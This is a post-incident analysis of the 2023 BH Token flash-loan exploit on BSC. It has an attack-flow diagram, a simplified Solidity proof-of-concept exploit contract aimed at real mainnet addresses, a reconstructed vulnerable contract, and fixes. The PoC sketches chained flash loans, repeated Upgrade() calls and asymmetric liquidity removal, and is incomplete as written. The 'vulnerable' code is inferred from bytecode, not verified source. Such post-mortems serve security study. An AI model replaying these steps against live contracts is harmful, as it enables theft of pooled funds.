# BH Flash Loan Liquidity Manipulation Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | BH Token |
| Date | 2023-10-18 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~$1,270,000 USD |
| Attack Type | Flash Loan + Repeated Upgrade + Asymmetric Liquidity Removal |
| CWE | CWE-284 (Improper Access Control) |
| Attacker Address | `0xfdbfceea1de360364084a6f37c9cdb7aaea63464` |
| Attack Contract | `0x216ccfd4fb3f2267677598f96ef1ff151576480c` |
| Vulnerable Contract | `0xcc61cc9f2632314c9d452aca79104ddf680952b5` (BH Token) |
| Fork Block | 32,512,073 |

## 2. Vulnerability Code Analysis

The unverified BH Token contract allowed internal pool state to be modified via the `Upgrade()` function. This function could be called repeatedly without any access control, enabling manipulation of the liquidity add/remove ratio to withdraw more BUSDT than deposited.

```solidity
// Vulnerable pattern: Repeated Upgrade with no access control
contract UnverifiedContract {
    uint256 public upgradeMultiplier;
    mapping(address => uint256) public liquidityProvided;

    // Vulnerable: Upgrade function callable by anyone, repeatedly
    function Upgrade() external {
        // Liquidity multiplier increases with each call
        upgradeMultiplier += 1;
        liquidityProvided[msg.sender] += calculateBonus();
    }

    // Vulnerable: Asymmetric liquidity removal using manipulated multiplier
    function removeLiquidity(uint256 amount) external {
        uint256 busdtAmount = amount * upgradeMultiplier; // uses manipulated multiplier
        BUSDT.transfer(msg.sender, busdtAmount);
    }
}
```

**Vulnerability**: The `Upgrade()` function could be called repeatedly without access control. After 12 repeated calls, invoking add liquidity (`0x33688938`) followed by 10 repeated calls to asymmetric remove liquidity (`0x4e290832`) allowed the attacker to withdraw more BUSDT than was originally deposited.

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: Flash Loan + Repeated Upgrade + Asymmetric Liquidity Removal
// Source code unverified — analysis based on bytecode
```

## 3. Attack Flow

```
Attacker [0xfdbfceea1de360364084a6f37c9cdb7aaea63464]
  │
  ├─1─▶ 5-layer DODO DPP Oracle Flash Loan
  │      DPPOracle1.flashLoan() → DPPOracle2 → DPPOracle3 → DPP → DPPAdvanced
  │      [BUSDT: 0x55d398326f99059fF775485246999027B3197955]
  │      Acquire large amount of BUSDT
  │
  ├─2─▶ WBNB_BUSDT.swap() - Additional BUSDT acquisition via WBNB swap
  │
  ├─3─▶ BUSDT_USDC.flash() - Additional flash loan
  │      [Uniswap V3 BUSDT-USDC Pool]
  │
  ├─4─▶ UnverifiedContract1.Upgrade() × 12 iterations
  │      [UnverifiedContract1: attack target contract]
  │      Manipulate liquidity multiplier
  │
  ├─5─▶ Call function 0x33688938() - Add liquidity
  │      Provide liquidity using manipulated multiplier
  │
  ├─6─▶ BUSDTToBH() - Swap BUSDT → BH
  │      [BH: 0xCC61CC9F2632314c9d452acA79104DDf680952b5]
  │
  ├─7─▶ Function 0x4e290832() × 10 iterations - Asymmetric liquidity removal
  │      Withdraw more BUSDT than deposited
  │
  └─8─▶ Repay all flash loans + realize ~$1.27M profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IUnverifiedContract {
    function Upgrade() external;
}

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract BHExploit {
    IUnverifiedContract target;
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 BH = IERC20(0xCC61CC9F2632314c9d452acA79104DDf680952b5);
    IDPPOracle DPPOracle1;
    IDPPOracle DPPOracle2;
    IDPPOracle DPPOracle3;
    IDPPOracle DPP;
    IDPPOracle DPPAdvanced;
    Uni_Pair_V2 WBNB_BUSDT;
    Uni_Pair_V3 BUSDT_USDC;
    Uni_Router_V2 router;

    function testExploit() external {
        // Initiate 5-layer DPP Oracle flash loan
        DPPOracle1.flashLoan(0, BUSDT.balanceOf(address(DPPOracle1)) * 99/100, address(this), "bh1");
    }

    function DPPFlashLoanCall(address, uint256, uint256 quoteAmount, bytes calldata data) external {
        if (/* last flash loan */ true) {
            // Call Upgrade 12 times
            for (uint i = 0; i < 12; i++) {
                target.Upgrade();
            }

            // Add liquidity (direct function selector call)
            (bool s1,) = address(target).call(abi.encodeWithSelector(0x33688938, BUSDT.balanceOf(address(this))));
            require(s1);

            // BUSDT → BH
            BUSDTToBH();

            // Asymmetric liquidity removal × 10 iterations
            for (uint i = 0; i < 10; i++) {
                (bool s2,) = address(target).call(abi.encodeWithSelector(0x4e290832));
                require(s2);
            }

            // Repay flash loans
            BUSDT.transfer(address(BUSDT_USDC), quoteAmount);
        }
    }

    function BUSDTToBH() internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(BH);
        BUSDT.approve(address(router), type(uint256).max);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            BUSDT.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-284 (Improper Access Control) |
| Vulnerability Type | Unrestricted repeated Upgrade calls, asymmetric liquidity removal |
| Impact Scope | BH Token liquidity pool |
| Explorer | [BSCscan](https://bscscan.com/address/0xcc61cc9f2632314c9d452aca79104ddf680952b5) |

## 6. Security Recommendations

```solidity
// Fix 1: Add onlyOwner to Upgrade
contract BHProtocol {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function Upgrade() external onlyOwner {
        // Only admin can upgrade
        upgradeMultiplier += 1;
    }
}

// Fix 2: Cap on liquidity removal ratio
function removeLiquidity(uint256 amount) external {
    uint256 maxRemovable = liquidityProvided[msg.sender];
    require(amount <= maxRemovable, "Cannot remove more than provided");

    // Enforce 1:1 ratio relative to deposit
    uint256 busdtAmount = amount; // no multiplier applied
    liquidityProvided[msg.sender] -= amount;
    BUSDT.transfer(msg.sender, busdtAmount);
}

// Fix 3: Rate limit on repeated calls
mapping(address => uint256) public lastUpgradeBlock;

function Upgrade() external onlyOwner {
    require(block.number > lastUpgradeBlock[msg.sender] + 100, "Upgrade too frequent");
    lastUpgradeBlock[msg.sender] = block.number;
    upgradeMultiplier += 1;
}
```

## 7. Lessons Learned

1. **Access Control on Upgrade Functions**: Any `Upgrade()` function that modifies internal state must be restricted to administrators only. Designs where repeated calls cause linear state growth are especially dangerous.
2. **Direct Function Selector Calls**: The attacker invoked function selectors `0x33688938` and `0x4e290832` directly to execute the attack. This indicates that vulnerable functions were hidden within an unverified contract.
3. **Risk of Unverified Contracts**: DeFi protocols that interact with contracts whose source code is not publicly verified are exposed to unaudited vulnerabilities. All integrated contracts must have verified source code.
4. **Large-Scale Loss Pattern on BSC**: The pattern of mobilizing millions of dollars via 5-layer DPP Oracle flash loans is responsible for the largest losses on BSC. Defending against attacks of this scale requires design measures well beyond simple access control.